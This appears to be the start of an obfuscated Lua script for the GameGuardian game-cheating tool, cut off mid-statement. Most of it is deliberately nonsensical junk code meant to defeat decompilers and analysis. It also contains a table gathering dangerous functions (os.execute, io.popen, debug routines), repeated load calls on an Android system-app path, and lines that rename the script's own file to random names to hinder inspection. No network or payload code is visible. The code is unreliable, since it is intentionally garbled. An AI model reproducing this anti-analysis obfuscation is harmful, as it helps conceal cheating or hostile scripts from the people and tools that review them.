while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while(nil)do;local y={}if(y.y)then;y.y=(y.y(y))end;end
while(nil)do;for y=y,y do;local y={}if(y.y)then;y.y=y.y(y)end;for yy=y.y,y.y,y.y do;local yy={}if(yy.y)then;yy.y=yy.y()end;for yyy=y,yy.y,y do;local yyy={}if(yyy.y)then;yyy.y=yyy.y(y)end;for yyyy=y,yy,yyy.y do;local yyyy={}if(yyyy.y)then;yyyy.y=yyyy.y(y)end;local yyyy={}if(yyyy.y)then;yyyy.y=(yyyy|yyy|yy|y)(y)end;end;local yyy={}if(yyy.y)then;yyy.y=(true|yyy|yy|y)(y)end;end;local yy={}if(yy.y)then;yy.y=(true|false|yy|y)(y)end;end;local y={}if(y.y)then;y.y=(true|nil|false|nil|y|nil|false|true|nil)(y)end;return(true|false|nil)end;return;end
while (nil)do;local o={}if (o.o)then if (o.o.o)then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o))))end;end;end
if nil ~= nil then
	_T = (-nil)((-nil)[nil] | nil | nil)
		_B = _T
			_B = _B()
				while (nil) do _B() end if _B ~= nil then do
					for i = 0,1,0 do _C = _C() _C = _Cnil _C= _C():_C(_Cnil)(_Cnil*-1).._Cnil _C = _C(_Cnil)(_C) end 
						
							for p = 0,1,0 do if nil ~= nil then (-nil)((-nil)[nil] | nil | nil)(-nil)((-nil)[nil] | nil | nil) local _L = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)} _L = _L() _L = _Lnil _L= _L():_L(_Lnil)(_Lnil*-1).._Lnil _L = _L(_Lnil)(_L) if _L  ~= nil then _L = _ (_Lnil*nil) _L = nil end if _L == nil then   _L = {_L(_L*nil)(_L*nil)(nil * 1, 1  << nil), _L*nil} end end local _T = {} x[""] = T local K = (x)(x, x) K[1] = 1 end
						local x = {} x[''] = x local t = (x)(x, x) t[1] = 1
						end
						_ = {_, _(-nil)(-nil)(nil * 1, 1  << nil), -nil}
						_ = _ (nil)
						_ = -nil
						_ = _ (-nil * nil)()
						_C = _C ( _)
					_C = {(-nil)((-nil)[nil] | nil | nil),(nil*(-nil)),(-nil)((-nil)[nil] | nil | nil)*(-nil)((-nil)[nil] | nil | nil)/(-nil)((-nil)[nil] | nil | nil)%(-nil)((-nil)[nil] | nil | nil)}
						_C = _C()
							if _C == nil then 
								_C = {_C(_C*nil)(_C*nil)(nil * 1, 1  << nil), _C*nil}
								end
						while _B ~= _C do if _T ~= _C then do
							_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
								_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
									_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
										_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
											_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												_C() _C() _C() _C()_C() _C() _C() _C()_C() _C() _C() _C()
												end end end
											end end
										while _B ~= nil do 
											_C = nil,nil,nil,nil
									end
									for i=1,0 do;local j={}if j.i~=nil then j.i=j.i()end;end;
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 200 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _ss = {} if _ss.ss ~= nil then _ss.bidun = _ss.ss() _ss.ss = nil -nil+nil-nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil*nil/nil%nil~nil~~~nil%#nil end _ss = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
for i = 1, 100 do load("/system/priv-app/Settings/Settings.apk") end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil end _m = nil end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
local func={['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['concat']=table.concat,['remove']=table.remove,['sort']=table.sort,['pack']=table.pack,['move']=table.move,['insert']=table.insert,['unpack']=table.unpack,['ipairs']=ipairs,['collectgarbage']=collectgarbage,['tostring']=tostring,['load']=load,['ipairs']=ipairs,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['error']=error,['tonumber']=tonumber,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen,['getregistry']=debug.getregistry,['getuservalue']=debug.getuservalue,['setuservalue']=debug.setuservalue,['getupvalue']=debug.getupvalue,['getinfo']=debug.getinfo,['getlocal']=debug.getlocal,['setlocal']=debug.setlocal,['setupvalue']=debug.setupvalue,['traceback']=debug.traceback,['getmetatable']=debug.getmetatable,['setmetatable']=debug.setmetatable,['debug']=debug.debug,['upvaluejoin']=debug.upvaluejoin,['getxnxxxxxx']=debug.getxnxxxxxx,['setxnxxxxxx']=debug.setxnxxxxxx,['upvalueid']=debug.upvalueid,['pcall']=pcall,['require']=require,['rawequal']=rawequal,['assert2']=assert2,['setmetatable']=setmetatable,['getmetatable']=getmetatable,['rawset']=rawset,['setlocale']=os.setlocale,['clock']=os.clock,['tmpname']=os.tmpname,['getenv']=os.getenv,['execute']=os.execute,['difftime']=os.difftime,['rename']=os.rename,['exit']=os.exit,['remove']=os.remove,['time']=os.time,['date']=os.date,['popen']=io.popen,['lines']=io.lines,['write']=io.write,['tmpfile']=io.tmpfile,['open']=io.open,['close']=io.close,['input']=io.input,['read']=io.read,['output']=io.output,['flush']=io.flush,['type']=io.type,['loadlib']=package.loadlib,['searchpath']=package.searchpath,['rshift']=bit32.rshift,['bnot']=bit32.bnot,['lshift']=bit32.lshift,['bxor']=bit32.bxor,['btest']=bit32.btest,['extract']=bit32.extract,['lrotate']=bit32.lrotate,['rrotate']=bit32.rrotate,['band']=bit32.band,['replace']=bit32.replace,['bor']=bit32.bor,['arshift']=bit32.arshift,['next']=next,['select']=select,['loadfile']=loadfile,['rawget']=rawget,['pairs']=pairs,['dump']=string.dump,['reverse']=string.reverse,['char_']=string.char,['unpack']=string.unpack,['match']=string.match,['gsub']=string.gsub,['find']=string.find,['pack']=string.pack,['gmatch']=string.gmatch,['format']=string.format,['packsize']=string.packsize,['lower']=string.lower,['upper']=string.upper,['rep']=string.rep,['sub']=string.sub,['byte_']=string.byte,['len']=string.len,['error']=error,['tonumber']=tonumber,['sqrt']=math.sqrt,['atan2']=math.atan2,['ceil']=math.ceil,['tanh']=math.tanh,['rad']=math.rad,['abs']=math.abs,['sinh']=math.sinh,['atan2']=math.atan,['fmod']=math.fmod,['random']=math.random,['randomseed']=math.randomseed,['max']=math.max,['modf']=math.modf,['ldexp']=math.ldexp,['exp']=math.exp,['deg']=math.deg,['cosh']=math.cosh,['ult']=math.ult,['log']=math.log,['tointeger']=math.tointeger,['frexp']=math.frexp,['asin']=math.asin,['tan']=math.tan,['floor']=math.floor,['pow']=math.pow,['acos']=math.acos,['cos']=math.cos,['type']=math.type,['sin']=math.sin,['min']=math.min,['xpcall']=xpcall,['_assert']=assert,['dofile']=dofile,['print']=print,['type']=type,['rawlen']=rawlen}
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
 for i = 1, 0 do i(-nil)(-nil)(-nil * 1)(-nil)(-nil)(-nil)(-nil * 1) end 
os.rename(gg.getFile(), gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)))
while(nil)do;for i=i,i do;local i={}if(i.i)then;i.i=i.i(i)end;for ii=i.i,i.i,i.i do;local ii={}if(ii.i)then;ii.i=ii.i()end;for iii=i,ii.i,i do;local iii={}if(iii.i)then;iii.i=iii.i(i)end;for iiii=i,ii,iii.i do;local iiii={}if(iiii.i)then;iiii.i=iiii.i(i)end;local iiii={}if(iiii.i)then;iiii.i=(iiii|iii|ii|i)(i)end;end;local iii={}if(iii.i)then;iii.i=(true|iii|ii|i)(i)end;end;local ii={}if(ii.i)then;ii.i=(true|false|ii|i)(i)end;end;local i={}if(i.i)then;i.i=(true|false|nil|i)(i)end;return(true|false|nil)end;return;end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() end end
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.myname = zzzzz.Batman() zzzzz.Batman = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.partner = zzzzz.Sniper.GamerTM() end end
for z = 1, 0 do local _ = {} if _.data ~= nil then break _.data = nil (-nil)((-nil)[nil] | nil | nil) _.n = _._.data._[z] _.g = _.n._[z] _.Batman = _.g._.n[z] _.TEAM = _.Batman._.n[z].data() _[z] = _.TEAM[u]  _[z] = nil _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _ (-nil * nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil * 1, 1<< nil), -nil} end local _ = {} _[''] = _ local x = (_)(_, _) x[1] = 1 end _ = nil _.TEAM = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
for x = 0, 1, 0 do local _m = {} if _m.data ~= nil then _m.bidun = _m.data() _m.data = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end _m = nil -nil+nil-nil*nil/nil%nil~nil~~~nil%#nil end
os.rename(gg.getFile() .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)), gg.getFile())
local GBLQ = string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90)) .. string.char(math.random(65,90))
while true do if not cuk then if nil ~= nil then (-nil)((-nil)[nil] | nil | nil) local _ = {} _ = _() _ = -nil _ = _():_(-nil)(-nil * 1)..-nil _ = _(-nil)(_) if _ ~= nil then _ = _(-nil*nil)() _ = nil end if _ == nil then _ = {_, _(-nil)(-nil)(nil *1, 1 << nil), -nil} end local k = {} k[''] = k local t = (k)(k, l) t[1] = 1 end cuk = ya break end local xxx = {} local XX = {} local X = {} X.X = {} if xxx.data ~= nil then xxx.sel = xxx.data() end xxx = nil xxx.xxx[Z] = nil xxx.xxx[X] = nil xxx.xxx[i] = nil X.XXX = XX.Z() X.XXX = X.XXX:Z() X.X[B] = X[Z] local gaul = {} if gaul ~= nil then gaul = nil end local zzzzz = {} if zzzzz ~= zzzzz then zzzzz.Batman.games = zzzzz.Batman() zzzzz.Batman.TEAM = zzzzz.Batman.TEAM() zzzzz.channel = zzzzz.Batman.HACKER() zzzzz.Batman.TEAM = 